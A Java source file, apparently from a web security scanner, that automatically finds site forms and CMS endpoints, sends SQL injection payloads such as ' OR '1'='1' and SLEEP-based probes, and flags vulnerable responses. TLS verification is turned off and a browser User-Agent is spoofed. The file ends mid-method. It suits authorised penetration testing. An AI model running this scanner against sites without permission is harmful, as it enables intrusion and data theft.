package it.r2u.anibus.service;

import it.r2u.anibus.model.EndpointInfo;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * SQL Injection analyzer that tests discovered endpoints with injection payloads.
 * Supports CMS-specific injection profiles and automatic HTML form/link discovery.
 * Loads payloads from resource file and iterates through them against each endpoint.
 */
public class SQLInjectionAnalyzer {

    private static final int TIMEOUT = 8000;

    private final List<String> payloads = new ArrayList<>();
    private final Map<String, List<InjectionResult>> results = new LinkedHashMap<>();

    // CMS profiles: CMS name → list of known injection-prone endpoints
    private final Map<String, List<CmsEndpointProfile>> cmsProfiles = new LinkedHashMap<>();

    // Patterns indicating SQL error responses (database type detection)
    private static final Map<String, Pattern> DB_ERROR_PATTERNS = new LinkedHashMap<>();

    static {
        DB_ERROR_PATTERNS.put("MySQL", Pattern.compile(
                "SQL syntax.*?MySQL|Warning.*?mysql_|MySQLSyntaxErrorException|com\\.mysql\\.jdbc|SQLSTATE\\[HY|mysql_fetch|mysql_num_rows",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("PostgreSQL", Pattern.compile(
                "PostgreSQL.*?ERROR|Warning.*?\\bpg_|valid PostgreSQL result|Npgsql\\.|PG::SyntaxError|org\\.postgresql",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("Microsoft SQL Server", Pattern.compile(
                "Driver.*?SQL[\\- ]?Server|OLE DB.*?SQL Server|\\bSQL Server\\b.*?Error|SQLServer JDBC|Microsoft SQL Native Client|ODBC SQL Server Driver|SQLSrv|mssql_query|System\\.Data\\.SqlClient",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("Oracle", Pattern.compile(
                "\\bORA-\\d{5}|Oracle error|Oracle.*?Driver|Warning.*?\\boci_|Warning.*?\\bora_|oracle\\.jdbc|OracleException",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("SQLite", Pattern.compile(
                "SQLite/JDBCDriver|SQLite\\.Exception|System\\.Data\\.SQLite|Warning.*?sqlite_|\\[SQLITE_ERROR\\]|sqlite3\\.OperationalError|SQLITE_CONSTRAINT",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("MariaDB", Pattern.compile(
                "MariaDB|Warning.*?mariadb",
                Pattern.CASE_INSENSITIVE));
        DB_ERROR_PATTERNS.put("MongoDB", Pattern.compile(
                "MongoError|MongoDB.*?Error|\\$where|\\$gt|\\$ne|\\$regex|mongo.*?exception",
                Pattern.CASE_INSENSITIVE));
    }

    // Patterns indicating successful injection (data leakage)
    private static final List<Pattern> DATA_LEAK_PATTERNS = List.of(
            Pattern.compile("root:x:\\d+:\\d+", Pattern.CASE_INSENSITIVE),
            Pattern.compile("information_schema", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mysql\\.user|pg_catalog|sys\\.objects", Pattern.CASE_INSENSITIVE),
            Pattern.compile("@@version|@@datadir|@@hostname", Pattern.CASE_INSENSITIVE),
            Pattern.compile("table_name.*?column_name|column_name.*?table_name", Pattern.CASE_INSENSITIVE)
    );

    // Patterns for time-based detection
    private static final List<String> TIME_BASED_KEYWORDS = List.of(
            "SLEEP(", "WAITFOR", "pg_sleep(", "BENCHMARK("
    );

    // HTML parsing patterns for auto-discovery
    private static final Pattern FORM_PATTERN = Pattern.compile(
            "<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>([\\s\\S]*?)</form>",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern FORM_METHOD_PATTERN = Pattern.compile(
            "method=[\"']([^\"']*)[\"']", Pattern.CASE_INSENSITIVE);
    private static final Pattern INPUT_PATTERN = Pattern.compile(
            "<input[^>]*name=[\"']([^\"']*)[\"'][^>]*/?>",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_PATTERN = Pattern.compile(
            "<select[^>]*name=[\"']([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern TEXTAREA_PATTERN = Pattern.compile(
            "<textarea[^>]*name=[\"']([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern LINK_WITH_PARAMS_PATTERN = Pattern.compile(
            "<a[^>]*href=[\"']([^\"']*\\?[^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern HIDDEN_INPUT_PATTERN = Pattern.compile(
            "<input[^>]*type=[\"']hidden[\"'][^>]*name=[\"']([^\"']*)[\"'][^>]*/?>",
            Pattern.CASE_INSENSITIVE);

    // Mapping: CMS display name → resource filename (without .txt)
    private static final Map<String, String> CMS_FILE_MAP = Map.ofEntries(
            Map.entry("WordPress", "wordpress"),
            Map.entry("Joomla", "joomla"),
            Map.entry("Drupal", "drupal"),
            Map.entry("Magento", "magento"),
            Map.entry("1C-Bitrix", "bitrix"),
            Map.entry("OpenCart", "opencart"),
            Map.entry("PrestaShop", "prestashop"),
            Map.entry("ModX", "modx"),
            Map.entry("Shopify", "shopify"),
            Map.entry("Generic", "generic")
    );

    public SQLInjectionAnalyzer() {
        loadPayloads();
        loadCmsProfiles();
    }

    /**
     * Load injection payloads from individual category files in payloads/ folder.
     * Reads payloads/index.txt to discover which category files to load.
     */
    private void loadPayloads() {
        try {
            List<String> categoryFiles = readIndexFile("/it/r2u/anibus/injections/payloads/index.txt");
            for (String category : categoryFiles) {
                loadPayloadFile("/it/r2u/anibus/injections/payloads/" + category + ".txt");
            }
        } catch (Exception e) {
            // Fallback: try loading legacy monolithic file
            loadPayloadFile("/it/r2u/anibus/injections/sql-injections.txt");
        }

        if (payloads.isEmpty()) {
            payloads.add("' OR '1'='1");
            payloads.add("' OR '1'='1'--");
            payloads.add("' UNION SELECT NULL--");
            payloads.add("' AND SLEEP(3)--");
        }
    }

    private void loadPayloadFile(String resourcePath) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                Objects.requireNonNull(getClass().getResourceAsStream(resourcePath)),
                StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.startsWith("#")) {
                    payloads.add(line);
                }
            }
        } catch (Exception ignored) {}
    }

    /**
     * Load CMS-specific injection profiles from individual CMS files in cms/ folder.
     * Reads cms/index.txt to discover which CMS files to load.
     */
    private void loadCmsProfiles() {
        try {
            List<String> cmsFiles = readIndexFile("/it/r2u/anibus/injections/cms/index.txt");
            for (String cmsFile : cmsFiles) {
                loadCmsProfileFile(cmsFile, "/it/r2u/anibus/injections/cms/" + cmsFile + ".txt");
            }
        } catch (Exception e) {
            // Fallback: try loading legacy monolithic file
            loadLegacyCmsProfiles();
        }
    }

    private void loadCmsProfileFile(String fileKey, String resourcePath) {
        // Resolve display name from file key
        String cmsName = CMS_FILE_MAP.entrySet().stream()
                .filter(entry -> entry.getValue().equals(fileKey))
                .map(Map.Entry::getKey)
                .findFirst()
                .orElse(fileKey); // use file key as name if no mapping found

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                Objects.requireNonNull(getClass().getResourceAsStream(resourcePath)),
                StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                // Format: METHOD|PATH|PARAMETERS|DESCRIPTION
                String[] parts = line.split("\\|", 4);
                if (parts.length < 2) continue;

                String method = parts[0].trim();
                String path = parts[1].trim();
                String paramStr = parts.length > 2 ? parts[2].trim() : "";
                String description = parts.length > 3 ? parts[3].trim() : "";

                List<String> params = paramStr.isEmpty() ? List.of() :
                        Arrays.stream(paramStr.split(","))
                                .map(String::trim)
                                .filter(s -> !s.isEmpty())
                                .collect(Collectors.toList());

                cmsProfiles.computeIfAbsent(cmsName, k -> new ArrayList<>())
                        .add(new CmsEndpointProfile(method, path, params, description));
            }
        } catch (Exception ignored) {}
    }

    /**
     * Fallback: load legacy monolithic cms-profiles.txt (old format with CMS_NAME| prefix).
     */
    private void loadLegacyCmsProfiles() {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                Objects.requireNonNull(getClass().getResourceAsStream("/it/r2u/anibus/injections/cms-profiles.txt")),
                StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] parts = line.split("\\|", 5);
                if (parts.length < 4) continue;

                String cms = parts[0].trim();
                String method = parts[1].trim();
                String path = parts[2].trim();
                String paramStr = parts.length > 3 ? parts[3].trim() : "";
                String description = parts.length > 4 ? parts[4].trim() : "";

                List<String> params = paramStr.isEmpty() ? List.of() :
                        Arrays.stream(paramStr.split(","))
                                .map(String::trim)
                                .filter(s -> !s.isEmpty())
                                .collect(Collectors.toList());

                cmsProfiles.computeIfAbsent(cms, k -> new ArrayList<>())
                        .add(new CmsEndpointProfile(method, path, params, description));
            }
        } catch (Exception ignored) {}
    }

    /**
     * Read index.txt file that lists resource file names (one per line).
     */
    private List<String> readIndexFile(String resourcePath) throws Exception {
        List<String> entries = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                Objects.requireNonNull(getClass().getResourceAsStream(resourcePath)),
                StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.startsWith("#")) {
                    entries.add(line);
                }
            }
        }
        return entries;
    }

    /**
     * Returns the number of loaded payloads.
     */
    public int getPayloadCount() {
        return payloads.size();
    }

    /**
     * Returns the set of CMS names that have injection profiles loaded.
     */
    public Set<String> getSupportedCmsTypes() {
        return Collections.unmodifiableSet(cmsProfiles.keySet());
    }

    /**
     * Discover injection-testable endpoints from HTML source.
     * Parses forms, links with query parameters, and input fields.
     *
     * @param htmlSource the HTML page content
     * @param baseUrl    the base URL of the page
     * @return list of discovered endpoints with parameters
     */
    public List<EndpointInfo> discoverEndpointsFromHtml(String htmlSource, String baseUrl) {
        List<EndpointInfo> discovered = new ArrayList<>();
        if (htmlSource == null || htmlSource.isEmpty()) return discovered;

        Set<String> seen = new HashSet<>();

        // 1. Discover forms with input fields
        Matcher formMatcher = FORM_PATTERN.matcher(htmlSource);
        while (formMatcher.find()) {
            String action = formMatcher.group(1);
            String formBody = formMatcher.group(2);

            // Determine form method
            String fullFormTag = htmlSource.substring(
                    Math.max(0, formMatcher.start()),
                    Math.min(htmlSource.length(), formMatcher.start() + 500));
            Matcher methodMatcher = FORM_METHOD_PATTERN.matcher(fullFormTag);
            String method = methodMatcher.find() ? methodMatcher.group(1).toUpperCase() : "GET";

            // Extract all input/select/textarea names
            List<String> params = new ArrayList<>();
            extractFieldNames(formBody, INPUT_PATTERN, params);
            extractFieldNames(formBody, SELECT_PATTERN, params);
            extractFieldNames(formBody, TEXTAREA_PATTERN, params);

            // Remove hidden fields (CSRF tokens, session IDs, nonces — not useful for injection)
            List<String> hiddenFields = new ArrayList<>();
            extractFieldNames(formBody, HIDDEN_INPUT_PATTERN, hiddenFields);
            params.removeAll(hiddenFields);

            // Remove remaining CSRF tokens and submit buttons from testable params
            params.removeIf(p -> p.toLowerCase().matches(
                    ".*(_token|csrf|__requestverificationtoken|captcha|submit|button).*"));

            if (params.isEmpty()) continue;

            String resolvedUrl = resolveUrl(action, baseUrl);
            String key = method + "|" + resolvedUrl + "|" + String.join(",", params);
            if (seen.add(key)) {
                discovered.add(new EndpointInfo(
                        resolvedUrl, baseUrl, action, method,
                        params, Map.of(), "HTML form", false));
            }
        }

        // 2. Discover links with query parameters
        Matcher linkMatcher = LINK_WITH_PARAMS_PATTERN.matcher(htmlSource);
        while (linkMatcher.find()) {
            String href = linkMatcher.group(1);
            if (href.startsWith("#") || href.startsWith("javascript:") || href.startsWith("mailto:")) continue;

            // Extract parameters from URL
            int qIdx = href.indexOf('?');
            if (qIdx < 0) continue;
            String queryString = href.substring(qIdx + 1);
            String path = href.substring(0, qIdx);

            List<String> params = new ArrayList<>();
            for (String pair : queryString.split("&")) {
                String[] kv = pair.split("=", 2);
                if (kv.length > 0 && !kv[0].isEmpty()) {
                    params.add(kv[0]);
                }
            }

            if (params.isEmpty()) continue;

            String resolvedUrl = resolveUrl(path, baseUrl);
            String key = "GET|" + resolvedUrl + "|" + String.join(",", params);
            if (seen.add(key)) {
                discovered.add(new EndpointInfo(
                        resolvedUrl, baseUrl, path, "GET",
                        params, Map.of(), "HTML link", false));
            }
        }

        return discovered;
    }

    private void extractFieldNames(String html, Pattern pattern, List<String> target) {
        Matcher m = pattern.matcher(html);
        while (m.find()) {
            String name = m.group(1).trim();
            if (!name.isEmpty() && !target.contains(name)) {
                target.add(name);
            }
        }
    }

    /**
     * Generate CMS-specific endpoints based on detected CMS type.
     *
     * @param cmsType  the detected CMS name (e.g., "WordPress", "Drupal")
     * @param baseUrl  the target base URL
     * @return list of CMS-specific endpoints to test
     */
    public List<EndpointInfo> generateCmsEndpoints(String cmsType, String baseUrl) {
        List<EndpointInfo> generated = new ArrayList<>();
        if (cmsType == null || cmsType.isEmpty()) return generated;

        // Load profiles for detected CMS + always include Generic profiles
        List<String> cmsKeys = new ArrayList<>();
        cmsKeys.add(cmsType);
        cmsKeys.add("Generic");

        for (String key : cmsKeys) {
            List<CmsEndpointProfile> profiles = cmsProfiles.get(key);
            if (profiles == null) continue;

            for (CmsEndpointProfile profile : profiles) {
                String fullUrl = resolveUrl(profile.path, baseUrl);
                generated.add(new EndpointInfo(
                        fullUrl, baseUrl, profile.path, profile.method,
                        new ArrayList<>(profile.parameters), Map.of(),
                        "CMS profile: " + key + " — " + profile.description,
                        profile.path.contains("{") || profile.path.matches(".*/(\\d+)(/.*)?$")));
            }
        }

        return generated;
    }

    /**
     * Full scan: combine JS-discovered endpoints, CMS profiles, and HTML-discovered forms.
     * This is the primary entry point for comprehensive injection testing.
     *
     * @param jsEndpoints       endpoints discovered from JS analysis (may be null)
     * @param baseUrl           the target base URL
     * @param cmsType           detected CMS type (may be null)
     * @param htmlSource        HTML page source for form/link discovery (may be null)
     * @param progressCallback  callback for progress updates
     * @return map of endpoint → list of injection results
     */
    public Map<String, List<InjectionResult>> testEndpointsWithCmsSupport(
            List<EndpointInfo> jsEndpoints, String baseUrl,
            String cmsType, String htmlSource,
            Consumer<String> progressCallback) {

        results.clear();

        // Phase 1: Collect all endpoints to test
        List<EndpointInfo> allEndpoints = new ArrayList<>();
        Set<String> dedup = new HashSet<>();

        // 1a. JS-discovered endpoints
        if (jsEndpoints != null) {
            for (EndpointInfo ep : jsEndpoints) {
                String key = (ep.getHttpMethod() != null ? ep.getHttpMethod() : "GET") + "|" + ep.getUrl();
                if (dedup.add(key)) {
                    allEndpoints.add(ep);
                }
            }
        }

        // 1b. CMS-specific endpoints
        if (cmsType != null && !cmsType.isEmpty()) {
            if (progressCallback != null) {
                progressCallback.accept("Generating " + cmsType + " CMS-specific injection targets...");
            }
            List<EndpointInfo> cmsEndpoints = generateCmsEndpoints(cmsType, baseUrl);
            for (EndpointInfo ep : cmsEndpoints) {
                String key = ep.getHttpMethod() + "|" + ep.getUrl();
                if (dedup.add(key)) {
                    allEndpoints.add(ep);
                }
            }
            if (progressCallback != null) {
                progressCallback.accept("Added " + cmsEndpoints.size() + " " + cmsType + " CMS endpoints");
            }
        }

        // 1c. HTML form/link discovery
        if (htmlSource != null && !htmlSource.isEmpty()) {
            if (progressCallback != null) {
                progressCallback.accept("Discovering forms and links from HTML...");
            }
            List<EndpointInfo> htmlEndpoints = discoverEndpointsFromHtml(htmlSource, baseUrl);
            for (EndpointInfo ep : htmlEndpoints) {
                String key = ep.getHttpMethod() + "|" + ep.getUrl();
                if (dedup.add(key)) {
                    allEndpoints.add(ep);
                }
            }
            if (progressCallback != null && !htmlEndpoints.isEmpty()) {
                progressCallback.accept("Discovered " + htmlEndpoints.size() + " endpoints from HTML forms/links");
            }
        }

        if (allEndpoints.isEmpty()) {
            if (progressCallback != null) {
                progressCallback.accept("No endpoints to test for injections");
            }
            return results;
        }

        // Phase 2: Filter testable endpoints
        List<EndpointInfo> testable = allEndpoints.stream()
                .filter(this::isTestableEndpoint)
                .collect(Collectors.toList());

        if (testable.isEmpty()) {
            testable = allEndpoints.stream()
                    .filter(e -> "GET".equalsIgnoreCase(e.getHttpMethod()) || e.getHttpMethod() == null)
                    .limit(30)
                    .collect(Collectors.toList());
        }

        if (progressCallback != null) {
            progressCallback.accept("Testing " + testable.size() + " endpoints with " +
                    payloads.size() + " injection payloads (" + (testable.size() * payloads.size()) + " total tests)...");
        }

        // Phase 3: Run injection tests
        int totalTests = testable.size() * payloads.size();
        int completed = 0;

        for (EndpointInfo endpoint : testable) {
            if (Thread.currentThread().isInterrupted()) break;

            List<InjectionResult> endpointResults = new ArrayList<>();
            String endpointUrl = resolveEndpointUrl(endpoint, baseUrl);

            for (String payload : payloads) {
                if (Thread.currentThread().isInterrupted()) break;

                completed++;
                if (progressCallback != null && completed % 10 == 0) {
                    progressCallback.accept(String.format("Injection testing: %d/%d (%.0f%%) — %s",
                            completed, totalTests, (completed * 100.0) / totalTests, endpointUrl));
                }

                InjectionResult result = testPayload(endpointUrl, endpoint, payload);
                if (result != null && result.isVulnerable()) {
                    endpointResults.add(result);
                }
            }

            if (!endpointResults.isEmpty()) {
                results.put(endpointUrl, endpointResults);
            }
        }

        if (progressCallback != null) {
            progressCallback.accept("Injection testing completed. " +
                    results.size() + " vulnerable endpoints found out of " + testable.size() + " tested.");
        }

        return results;
    }

    /**
     * Test all discovered endpoints with injection payloads (legacy method — no CMS support).
     *
     * @param endpoints  discovered endpoints from JS analysis
     * @param baseUrl    the target base URL
     * @param progressCallback  callback for progress updates (message text)
     * @return map of endpoint → list of injection results
     */
    public Map<String, List<InjectionResult>> testEndpoints(
            List<EndpointInfo> endpoints, String baseUrl,
            Consumer<String> progressCallback) {

        return testEndpointsWithCmsSupport(endpoints, baseUrl, null, null, progressCallback);
    }

    /**
     * Full automatic scan: fetches HTML, detects CMS, discovers forms/links,
     * generates CMS-specific endpoints, and runs comprehensive injection tests.
     *
     * @param jsEndpoints       endpoints discovered from JS analysis (may be null)
     * @param baseUrl           the target base URL
     * @param progressCallback  callback for progress updates
     * @return map of endpoint → list of injection results
     */
    public Map<String, List<InjectionResult>> fullScan(
            List<EndpointInfo> jsEndpoints, String baseUrl,
            Consumer<String> progressCallback) {

        // Phase 0: Fetch HTML and detect CMS
        String htmlSource = null;
        String detectedCms = null;

        if (progressCallback != null) {
            progressCallback.accept("Fetching target page for CMS detection and form discovery...");
        }

        htmlSource = fetchHtmlSource(baseUrl);
        if (htmlSource != null && !htmlSource.isEmpty()) {
            detectedCms = detectCmsFromHtml(htmlSource);
            if (detectedCms != null && progressCallback != null) {
                progressCallback.accept("Detected CMS: " + detectedCms +
                        " — loading " + detectedCms + " injection profile (" +
                        cmsProfiles.getOrDefault(detectedCms, List.of()).size() + " targets)");
            }
        }

        return testEndpointsWithCmsSupport(jsEndpoints, baseUrl, detectedCms, htmlSource, progressCallback);
    }

    /**
     * Fetch HTML source from a URL.
     */
    public String fetchHtmlSource(String url) {
        HttpResponse response = sendRequest(url, "GET", null);
        return response != null ? response.body() : null;
    }

    /**
     * Simple CMS detection from HTML content — mirrors HTTPAnalyzer logic.
     */
    private String detectCmsFromHtml(String html) {
        if (html == null || html.isEmpty()) return null;
        String lower = html.toLowerCase();

        if (lower.contains("wp-content") || lower.contains("wp-includes") || lower.contains("wordpress"))
            return "WordPress";
        if (lower.contains("joomla") || lower.contains("/components/com_"))
            return "Joomla";
        if (lower.contains("drupal") || lower.contains("/sites/default/"))
            return "Drupal";
        if (lower.contains("bitrix") || lower.contains("/bitrix/"))
            return "1C-Bitrix";
        if (lower.contains("modx") || lower.contains("/assets/components/"))
            return "ModX";
        if (lower.contains("opencart"))
            return "OpenCart";
        if (lower.contains("prestashop"))
            return "PrestaShop";
        if (lower.contains("magento") || lower.contains("mage/"))
            return "Magento";
        if (lower.contains("shopify") || lower.contains("cdn.shopify.com"))
            return "Shopify";

        return null;
    }

    /**
     * Test a single payload against an endpoint.
     */
    private InjectionResult testPayload(String endpointUrl, EndpointInfo endpoint, String payload) {
        try {
            boolean isTimeBased = TIME_BASED_KEYWORDS.stream()
                    .anyMatch(k -> payload.toUpperCase().contains(k));

            String method = endpoint.getHttpMethod() != null ? endpoint.getHttpMethod() : "GET";

            String testUrl;
            String postBody = null;

            if ("GET".equalsIgnoreCase(method) || "DELETE".equalsIgnoreCase(method)) {
                // Inject into URL parameters
                testUrl = injectIntoUrl(endpointUrl, payload);
            } else {
                // POST/PUT/PATCH — inject into body
                testUrl = endpointUrl;
                postBody = buildInjectionBody(endpoint, payload);
            }

            long startTime = System.currentTimeMillis();
            HttpResponse response = sendRequest(testUrl, method, postBody);
            long responseTime = System.currentTimeMillis() - startTime;

            if (response == null) return null;

            // Analyze response for signs of vulnerability
            String detectedDb = null;
            List<String> evidence = new ArrayList<>();
            boolean vulnerable = false;

            // 1. Check for database error messages
            for (Map.Entry<String, Pattern> entry : DB_ERROR_PATTERNS.entrySet()) {
                if (entry.getValue().matcher(response.body).find()) {
                    detectedDb = entry.getKey();
                    evidence.add("Database error detected: " + entry.getKey());
                    vulnerable = true;
                    break;
                }
            }

            // 2. Check for data leakage patterns
            for (Pattern p : DATA_LEAK_PATTERNS) {
                if (p.matcher(response.body).find()) {
                    evidence.add("Data leakage pattern detected");
                    vulnerable = true;
                    break;
                }
            }

            // 3. Time-based detection
            if (isTimeBased && responseTime > 2500) {
                evidence.add("Time-based delay detected: " + responseTime + "ms");
                vulnerable = true;
            }

            // 4. HTTP 500 errors with specific content
            if (response.statusCode == 500 && response.body.length() > 100) {
                boolean hasDbKeyword = response.body.toLowerCase().contains("sql") ||
                        response.body.toLowerCase().contains("query") ||
                        response.body.toLowerCase().contains("syntax") ||
                        response.body.toLowerCase().contains("database") ||
                        response.body.toLowerCase().contains("table");
                if (hasDbKeyword) {
                    evidence.add("Server error with database-related content (HTTP 500)");
                    vulnerable = true;
                }
            }

            // 5. Different response for injected vs normal (status code change)
            if (response.statusCode == 200 && payload.contains("OR") && payload.contains("1'='1")) {
                evidence.add("Possible authentication bypass (HTTP 200 on OR injection)");
                vulnerable = true;
            }

            if (vulnerable) {
                return new InjectionResult(
                        payload, endpointUrl, method,
                        response.statusCode, responseTime,
                        detectedDb, evidence, 
                        extractRelevantSnippet(response.body)
                );
            }

        } catch (Exception ignored) {
            // Connection errors are expected for many payloads
        }
        return null;
    }

    /**
     * Inject payload into URL query parameters.
     */
    private String injectIntoUrl(String url, String payload) {
        String encodedPayload = URLEncoder.encode(payload, StandardCharsets.UTF_8);
        if (url.contains("?")) {
            // Append payload to existing parameter value
            return url + encodedPayload;
        } else if (url.contains("{") || url.matches(".*/(\\d+)$")) {
            // Dynamic path — replace last segment
            return url.replaceAll("/[^/]*$", "/" + encodedPayload);
        } else {
            // Add as query parameter
            return url + "?id=" + encodedPayload;
        }
    }

    /**
     * Build injection body for POST/PUT requests.
     */
    private String buildInjectionBody(EndpointInfo endpoint, String payload) {
        List<String> params = endpoint.getParameters();
        if (params != null && !params.isEmpty()) {
            StringBuilder body = new StringBuilder();
            for (int i = 0; i < params.size(); i++) {
                if (i > 0) body.append("&");
                body.append(URLEncoder.encode(params.get(i), StandardCharsets.UTF_8));
                body.append("=");
                body.append(URLEncoder.encode(payload, StandardCharsets.UTF_8));
            }
            return body.toString();
        }
        return "id=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
    }

    /**
     * Resolve the full URL for an endpoint.
     */
    private String resolveEndpointUrl(EndpointInfo endpoint, String baseUrl) {
        String url = endpoint.getUrl();
        if (url != null && (url.startsWith("http://") || url.startsWith("https://"))) {
            return url;
        }
        String path = endpoint.getPath() != null ? endpoint.getPath() : url;
        if (path == null) return baseUrl;
        if (path.startsWith("/")) {
            // Absolute path — combine with base
            try {
                URI base = URI.create(baseUrl);
                return base.getScheme() + "://" + base.getHost() +
                        (base.getPort() > 0 ? ":" + base.getPort() : "") + path;
            } catch (Exception e) {
                return baseUrl + path;
            }
        }
        return baseUrl.endsWith("/") ? baseUrl + path : baseUrl + "/" + path;
    }

    /**
     * Check if an endpoint is suitable for injection testing.
     */
    private boolean isTestableEndpoint(EndpointInfo endpoint) {
        if (endpoint.getParameters() != null && !endpoint.getParameters().isEmpty()) return true;
        if (endpoint.isDynamic()) return true;
        String url = endpoint.getUrl();
        if (url != null && (url.contains("?") || url.contains("{") || url.matches(".*/(\\d+)(/.*)?$"))) return true;
        String path = endpoint.getPath();
        return path != null && (path.contains("?") || path.contains("{") || path.matches(".*/(\\d+)(/.*)?$"));
    }

    /**
     * Send HTTP request with SSL bypass for testing.
     */
    private HttpResponse sendRequest(String url, String method, String body) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();

            if (conn instanceof HttpsURLConnection httpsConn) {
                SSLContext sc = SSLContext.getInstance("TLS");
                sc.init(null, new TrustManager[]{new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] c, String a) {}
                    public void checkServerTrusted(X509Certificate[] c, String a) {}
                }}, new java.security.SecureRandom());
                httpsConn.setSSLSocketFactory(sc.getSocketFactory());
                httpsConn.setHostnameVerifier((h, s) -> true);
            }

            conn.setRequestMethod("GET".equalsIgnoreCase(method) || "DELETE".equalsIgnoreCase(method) ? method : "POST");
            conn.setConnectTimeout(TIMEOUT);
            conn.setReadTimeout(TIMEOUT);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            conn.setRequestProperty("Accept", "*/*");
            conn.setInstanceFollowRedirects(true);

            if (body != null && ("POST".equalsIgnoreCase(method) || "PUT".equalsIgnoreCase(method) || "PATCH".equalsIgnoreCase(method))) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            }

            int statusCode = conn.getResponseCode();
            StringBuilder responseBody = new StringBuilder();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    statusCode >= 400 ? conn.getErrorStream() : conn.getInputStream(),
                    StandardCharsets.UTF_8))) {
                String line;
                int charsRead = 0;
                while ((line = reader.readLine()) != null && charsRead < 50000) {
                    responseBody.append(line).append("\n");
                    charsRead += line.length();
                }
            } catch (Exception ignored) {}

            conn.disconnect();
            return new HttpResponse(statusCode, responseBody.toString());

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Extract a relevant snippet from the response body (near SQL-related keywords).
     */
    private String extractRelevantSnippet(String body) {
        if (body == null || body.isEmpty()) return "";
        String[] keywords = {"sql", "query", "syntax", "error", "table", "column", "database", "mysql", "postgres", "oracle", "sqlite"};
        String lower = body.toLowerCase();
        for (String kw : keywords) {
            int idx = lower.indexOf(kw);
            if (idx >= 0) {
                int start = Math.max(0, idx - 50);
                int end = Math.min(body.length(), idx + 150);
                return "..." + body.substring(start, end).replaceAll("\\s+", " ") + "...";
            }
        }
        // Return first 200 chars if no keywords found
        return body.substring(0, Math.min(200, body.length())).replaceAll("\\s+", " ");
    }

    /**
     * Format injection results for display in console.
     */
    public String formatResults(Map<String, List<InjectionResult>> injectionResults) {
        if (injectionResults == null || injectionResults.isEmpty()) {
            return "=== SQL INJECTION TESTING ===\nNo vulnerabilities found.\n";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("=== SQL INJECTION TESTING ===\n");
        sb.append("Vulnerable endpoints: ").append(injectionResults.size()).append("\n\n");

        // Collect detected databases
        Set<String> detectedDatabases = new LinkedHashSet<>();
        int totalVulnerabilities = 0;

        for (Map.Entry<String, List<InjectionResult>> entry : injectionResults.entrySet()) {
            sb.append("► ").append(entry.getKey()).append("\n");
            for (InjectionResult r : entry.getValue()) {
                totalVulnerabilities++;
                sb.append("  • Payload: ").append(r.payload).append("\n");
                sb.append("    Method: ").append(r.method)
                        .append(" | Status: ").append(r.statusCode)
                        .append(" | Time: ").append(r.responseTime).append("ms\n");
                if (r.detectedDatabase != null) {
                    sb.append("    Database: ").append(r.detectedDatabase).append("\n");
                    detectedDatabases.add(r.detectedDatabase);
                }
                for (String ev : r.evidence) {
                    sb.append("    Evidence: ").append(ev).append("\n");
                }
                if (r.responseSnippet != null && !r.responseSnippet.isEmpty()) {
                    sb.append("    Response: ").append(r.responseSnippet).append("\n");
                }
                sb.append("\n");
            }
        }

        // Summary
        sb.append("--- INJECTION SUMMARY ---\n");
        sb.append("Total vulnerabilities found: ").append(totalVulnerabilities).append("\n");
        sb.append("Vulnerable endpoints: ").append(injectionResults.size()).append("\n");
        if (!detectedDatabases.isEmpty()) {
            sb.append("Detected databases: ").append(String.join(", ", detectedDatabases)).append("\n");
        }
        sb.append("Payloads tested: ").append(payloads.size()).append("\n");

        return sb.toString();
    }

    /**
     * Resolve a relative URL against a base URL.
     */
    private String resolveUrl(String path, String baseUrl) {
        if (path == null || path.isEmpty()) return baseUrl;
        if (path.startsWith("http://") || path.startsWith("https://")) return path;
        try {
            URI base = URI.create(baseUrl);
            String scheme = base.getScheme();
            String host = base.getHost();
            int port = base.getPort();
            String authority = host + (port > 0 ? ":" + port : "");
            if (path.startsWith("/")) {
                return scheme + "://" + authority + path;
            } else {
